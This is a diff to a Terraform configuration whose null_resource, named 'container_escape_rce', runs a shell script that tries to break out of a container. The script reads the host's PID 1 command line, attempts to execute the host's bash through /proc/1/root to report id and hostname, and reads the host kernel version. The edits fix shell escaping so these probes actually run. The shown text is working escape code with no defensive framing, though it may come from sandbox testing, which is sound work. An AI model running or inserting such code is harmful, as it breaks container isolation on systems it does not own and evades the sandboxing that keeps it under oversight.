@@ -42,7 +42,8 @@ resource "null_resource" "container_escape_rce" {
       # Method 2: Host process namespace manipulation
       echo "[*] Method 2: Process namespace escape"
       if [ -r "/proc/1/cmdline" ]; then
-        echo "[+] Host PID 1 cmdline: $$(cat /proc/1/cmdline | tr '\0' ' ')"
+        cmdline_content=$$(cat /proc/1/cmdline | tr '\0' ' ')
+        echo "[+] Host PID 1 cmdline: $$cmdline_content"
       fi
       
       # Check if we can access host processes
@@ -60,13 +61,14 @@ resource "null_resource" "container_escape_rce" {
       if [ -x "/proc/1/root/bin/bash" ]; then
         echo "[+] Host bash executable found - attempting execution"
         # Try different execution methods
-        echo "ESCAPE_TEST" | /proc/1/root/bin/bash -c 'echo "[!] HOST BASH EXECUTION: $$(id) on $$(hostname)"' 2>/dev/null || echo "[-] Direct execution failed"
+        echo "ESCAPE_TEST" | /proc/1/root/bin/bash -c 'echo "[!] HOST BASH EXECUTION: $(id) on $(hostname)"' 2>/dev/null || echo "[-] Direct execution failed"
       fi
       
       # Method 4: Memory-based host access
       echo "[*] Method 4: Host memory and device access"
       if [ -r "/proc/1/root/proc/version" ]; then
-        echo "[!] Host kernel version: $$(cat /proc/1/root/proc/version)"
+        host_kernel=$$(cat /proc/1/root/proc/version)
+        echo "[!] Host kernel version: $$host_kernel"
       fi
       
       # Check host devices
